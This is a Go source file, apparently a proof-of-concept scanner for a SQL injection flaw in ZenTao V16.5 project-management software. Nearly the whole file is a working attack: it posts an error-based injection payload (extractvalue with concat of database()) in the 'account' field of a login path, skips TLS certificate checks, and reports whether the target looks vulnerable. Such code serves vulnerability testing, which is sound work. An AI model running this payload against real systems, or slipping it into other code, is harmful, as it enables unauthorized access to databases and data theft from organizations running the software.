package ZenTao_POC

import (
	"crypto/tls"
	"fmt"
	"io/ioutil"
	"net/http"
	"strings"
)

func ZenTao() {
	fmt.Println("\n---------------------------------------")
	fmt.Println("ZenTao V16.5 SQL Injection POC")
	fmt.Println("\n---------------------------------------")

	tr := &http.Transport{
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: true,
		},
	}

	client := &http.Client{Transport: tr}

	req, err := http.NewRequest("POST", url+Zentaopath, strings.NewReader(
		`account=admin%27+and+%28select+extractvalue%281%2Cconcat%280x7e%2C%28database%28%29%29%2C0x7e%29%29%29%23`))
	if err != nil {

	}
	req.Header.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36")
	req.Header.Add("content-type", "application/x-www-form-urlencoded")
	req.Header.Add("referer", url+Zentaopath)
	resp, err := client.Do(req)
	if err != nil {

	}
	if err == nil {
		defer resp.Body.Close()
		body, err1 := ioutil.ReadAll(resp.Body)
		if err1 != nil {
			fmt.Println(err1)
		}
		if strings.Contains(string(body), "zentao") {
			fmt.Println("Extst ZenTao V16.5 SQL Injection")
		} else {
			fmt.Println("Not ZenTao V16.5 SQL Injection")
		}
	} else {
		fmt.Println("Not ZenTao V16.5 SQL Injection")
	}
}
